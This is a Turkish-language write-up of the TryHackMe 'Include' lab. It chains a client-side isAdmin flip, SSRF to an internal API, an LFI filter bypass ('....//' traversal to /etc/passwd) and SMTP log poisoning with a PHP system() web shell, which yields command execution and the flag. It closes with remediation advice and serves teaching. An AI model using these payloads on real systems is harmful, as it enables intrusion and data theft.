🚩 TryHackMe - Include Room Write-Up: From Business Logic to SSRF & Log Poisoning RCE

Bu laboratuvar, modern web uygulamalarında sıkça karşılaşılan zafiyetlerin zincirleme bir şekilde (attack chain) nasıl sömürüleceğini gösteren harika bir senaryodur. Operasyon; yetki yükseltme (Business Logic), Server-Side Request Forgery (SSRF), Local File Inclusion (LFI) ve Log Zehirleme (Log Poisoning) teknikleri kullanılarak sistemde Uzaktan Komut Çalıştırma (RCE) elde edilmesiyle sonuçlanmıştır.
🕵️‍♂️ Aşama 1: Keşif ve Yüzey Analizi (Reconnaissance)

Hedef sistemin mimarisini ve açık kapılarını anlamak için kapsamlı bir Nmap taraması ile başlıyoruz:
Bash

sudo nmap -Pn -vv -T4 -p- <TARGET_IP>
sudo nmap -A -vv -T4 -p 25,110,143,4000,50000 <TARGET_IP>

Kritik Bulgular:

    Port 25 (SMTP): Postfix mail sunucusu çalışıyor. Log Zehirleme (Log Poisoning) ihtimali için cebimizde tutuyoruz.

    Port 4000 (Node.js/Express): "Sign In" başlıklı bir giriş paneli barındırıyor (Review App).

    Port 50000 (Apache HTTPD): "System Monitoring Portal" isimli, daha kritik görünen bir web arayüzü.

🔓 Aşama 2: Business Logic & Privilege Escalation (Port 4000)

Port 4000'deki uygulamaya varsayılan kimlik bilgileriyle (default credentials) giriş yaptıktan sonra, kullanıcı profili sekmesini inceliyoruz.

Kullanıcı bilgilerini güncellerken araya girip giden istekleri (Request) okuduğumuzda, isAdmin adında bir parametrenin false olarak gönderildiğini tespit ediyoruz. Bu, yazılımcının yetki kontrolünü sunucu tarafında (Server-Side) değil, istemci tarafında (Client-Side) bıraktığını gösteren klasik bir Business Logic (İş Mantığı) hatasıdır.

    İsteği manipüle edip "isAdmin": true olarak sunucuya geri gönderiyoruz.

    Sonuç: Yetki yükseltme (Privilege Escalation) başarılı! Admin paneline, API ve Ayarlar (Settings) sekmelerine tam erişim sağlandı.

🌐 Aşama 3: SSRF ile İç Ağ Keşfi ve Veri Sızdırma

Admin panelindeki "Settings" bölümünde, dışarıdan bir URL alıp sunucuya banner resmi olarak indiren bir özellik bulunuyor. Bu özellik, dış veya iç ağa sunucu üzerinden istek yaptırabilmemiz için mükemmel bir SSRF (Server-Side Request Forgery) vektörüdür.

Ağ dinleyici (Python HTTP Server) kurarak özelliğin SSRF'e açık olduğunu doğruladıktan sonra, hedefimizi uygulamanın iç API'lerine (Internal API) çeviriyoruz.

SSRF zafiyetini kullanarak "Get All Admins API" uç noktasına (endpoint) sunucu üzerinden istek atıyoruz. Sunucu bu isteğe Base64 ile şifrelenmiş bir veri döndürüyor.
Veriyi decode ettiğimizde, asıl hedefimiz olan Port 50000 (System Monitoring Portal) için geçerli admin kimlik bilgilerini (credentials) ele geçiriyoruz.
📂 Aşama 4: Local File Inclusion (LFI) Filtre Atlatma (Port 50000)

Elde edilen şifrelerle Port 50000'e giriş yaptıktan sonra, web sitesinin kaynak kodunda şüpheli bir yapı tespit ediyoruz:
profile.php?img=profile.png

Parametrenin dışarıdan dosya çağırması (Include), burada potansiyel bir LFI zafiyeti olduğuna işaret eder. Ancak yazılımcı, dizin atlama karakterlerini (../) silen bir filtreleme (Sanitization) kurgulamış.

Bu filtreyi Double Encoding / Overlapping tekniği ile atlatıyoruz. ....// gönderdiğimizde, arka plandaki filtre ortadaki ../ kısmını siliyor ve geriye kalan karakterler birleşip tekrar ../ oluşturarak dizin atlamamıza izin veriyor.

LFI Payload:
Plaintext

profile.php?img=....//....//....//....//....//....//....//....//etc/passwd

Sistemin /etc/passwd dosyası başarıyla okunarak joshua ve charles isimli sistem kullanıcıları keşfedildi.
☠️ Aşama 5: LFI'dan RCE'ye Geçiş (Log Poisoning)

Dosya okuma yetkimizi, sunucuda komut çalıştırma (Remote Code Execution) seviyesine taşımak için Nmap taramasında bulduğumuz Port 25 (SMTP) servisini kullanıyoruz.

Hedefimiz, uygulamanın mail günlüklerini (logs) tuttuğu /var/log/mail.log dosyasına sızmak ve içine çalıştırılabilir zararlı PHP kodu yazmaktır.

Adım 1: Telnet ile Zehri Enjekte Etmek
Mail sunucusuna bağlanarak, e-posta alıcısı (Recipient) kısmına işletim sistemi komutlarını alacak bir PHP payload'u yerleştiriyoruz.
Bash

telnet <TARGET_IP> 25
HELO deneme.com
MAIL FROM: <hacker@test.com>
RCPT TO: <?php system($_GET['cmd']); ?>

Sunucu bu adresi geçersiz bulup hata veriyor (Bad recipient address syntax), ancak tam da istediğimiz gibi bu hatayı ve payload'umuzu mail.log dosyasının içine kaydediyor.

Adım 2: Zehri Tetiklemek (Exploitation)
LFI zafiyetini kullanarak zehirlediğimiz log dosyasını çağırıyor ve URL üzerinden cmd parametresi ile komut gönderiyoruz. Sunucu log dosyasını okurken bizim PHP kodumuzu derleyip çalıştırıyor.
Plaintext

profile.php?img=....//....//....//....//....//var/log/mail.log&cmd=whoami

Çıktı: www-data (Sisteme sızma başarılı!)
🏁 Aşama 6: Post-Exploitation & Bayrağı Yakalama

Sistemde komut çalıştırabilme yetkisiyle, /var/www/html dizininin içini listeliyoruz.

    Payload: &cmd=ls%20-la%20/var/www/html

Dizin içerisinde isim karmaşasıyla (hash) gizlenmiş bir metin dosyası (505eb0fb... .txt) bulunuyor. Son olarak cat komutuyla dosyayı okuyup bayrağı (Flag) ele geçiriyoruz.

    Payload: &cmd=cat%20/var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt

🛡️ Güvenlik Çözümleri (Remediation)

    Business Logic: Yetki (Privilege) kontrolleri, istemciden gelen parametrelerle (isAdmin=true) değil, sunucu tarafındaki güvenli session'lar üzerinden yapılmalıdır.

    SSRF: Dış URL'lerden veri çeken özellikler, sıkı bir "Whitelist" mimarisine oturtulmalı ve iç ağ IP bloklarına (127.0.0.1, 10.0.0.0/8 vb.) istek atılması engellenmelidir.

    LFI: Kullanıcı girdisi doğrudan dosya yoluna dahil edilmemeli, çağrılacak dosyalar veritabanında bir ID veya güvenli bir dizi ile eşleştirilmelidir.

    Log Güvenliği: Web sunucusu kullanıcısının (www-data), sistem log dosyalarını (/var/log/*) okuma yetkisi kısıtlanmalıdır.
